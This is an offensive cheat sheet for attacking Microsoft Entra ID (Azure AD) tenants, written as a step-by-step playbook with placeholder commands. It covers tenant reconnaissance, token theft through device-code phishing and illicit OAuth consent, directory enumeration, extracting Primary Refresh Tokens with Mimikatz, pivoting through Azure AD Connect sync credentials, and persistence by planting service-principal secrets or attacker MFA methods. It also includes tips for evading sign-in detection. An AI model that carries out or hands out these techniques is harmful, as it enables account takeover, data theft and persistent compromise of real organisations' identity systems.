Entra ID (Azure AD) Attacks - Cheat Sheet

Identity attacks against Microsoft cloud (Entra ID / M365). The modern domain
is the tenant: no NTLM/Kerberos, but OAuth tokens, device codes, consent
grants, and Primary Refresh Tokens (PRTs). Goal: get a token, then enumerate
and pivot - including back into on-prem AD (hybrid).
Replace the placeholders (<...>) with your own values.


Step 1 - Recon the tenant (unauthenticated)

Confirm the tenant exists and learn its identity setup before touching creds:

    # Tenant ID, domains, whether it's managed vs federated
    https://login.microsoftonline.com/<domain>/.well-known/openid-configuration
    https://login.microsoftonline.com/getuserrealm.srf?login=<user>@<domain>&xml=1

    # AADInternals (PowerShell) - rich recon
    Get-AADIntTenantID -Domain <domain>
    Invoke-AADIntReconAsOutsider -Domain <domain>

Federated = creds checked on-prem (ADFS). Managed = checked in the cloud.


Step 2 - Get a token (pick a path)

Path A - Valid creds (from spraying / phishing / on-prem dump):

    # AADInternals: get an access token interactively or with creds
    Get-AADIntAccessTokenForAADGraph -Credentials (Get-Credential)

    # roadtx (ROADtools) - flexible token acquisition
    roadtx gettokens -u <user>@<domain> -p <password>

Path B - Device-code phishing (no password, bypasses some MFA prompts):

    roadtx gettokens --device-code
    # gives you a code + URL; send to the victim. When they enter it on
    # microsoft.com/devicelogin, YOU receive their tokens.

Path C - Illicit consent grant (OAuth app phishing):
    Register a multi-tenant app, send the victim a consent URL requesting
    scopes (Mail.Read, Files.Read.All...). On consent you get a refresh token
    for their data - survives password changes, MFA-agnostic.


Step 3 - Enumerate with the token

    # ROADrecon - dump the whole directory to a local DB + web UI
    roadrecon auth -u <user>@<domain> -p <password>
    roadrecon gather
    roadrecon-gui            # browse users, groups, roles, apps, devices

    # AzureHound - BloodHound for the cloud (find paths to Global Admin)
    azurehound -u <user>@<domain> -p <password> list --tenant <tenant-id> -o output.json

Look for: Global Admin, Privileged Role Admin, app owners, dangerous API
permissions, dynamic groups, and users who can reset others' passwords.


Step 4 - PRT abuse (from a compromised joined device)

The Primary Refresh Token is the SSO master key on an Entra-joined Windows box:

    # Mimikatz - extract the PRT + session key
    privilege::debug
    sekurlsa::cloudap
    # then use ROADtoken / roadtx to mint tokens from the PRT

A stolen PRT = SSO as that user to all cloud apps, often MFA-satisfied.


Step 5 - Pivot cloud <-> on-prem (hybrid)

  - Azure AD Connect server is GOLD: holds sync creds. Compromise it ->
    AADInternals Get-AADIntSyncCredentials -> often the MSOL_ account
    (can DCSync on-prem) or password-hash-sync secrets.
  - Seamless SSO uses the AZUREADSSOACC$ computer account -> its hash forges
    silver tickets for cloud logon.
  - Global Admin -> can reset on-prem-synced accounts / add creds to apps.


Step 6 - Persist / escalate in the tenant

  - Add credentials (secret/cert) to a service principal you can edit ->
    app-only token that survives user password resets.
  - Add yourself to a privileged role / eligible PIM role.
  - Register an attacker auth method (MFA) on a victim if you can.


Cautions
  - Entra logs sign-ins (Conditional Access, risky sign-in detection). Use
    plausible user-agents; device-code & consent paths look more legitimate.
  - Refresh tokens are long-lived loot - guard and reuse them.


Key idea: in the cloud there's no patch for "a valid token." Entra trades
Kerberos tickets for OAuth tokens, so attacks shift to phishing tokens
(device code, consent), stealing them (PRT), and abusing over-privileged apps
and roles. Because most orgs are hybrid, the cloud and on-prem are two doors
into the same building - Azure AD Connect and Seamless SSO are the hallways
between them.
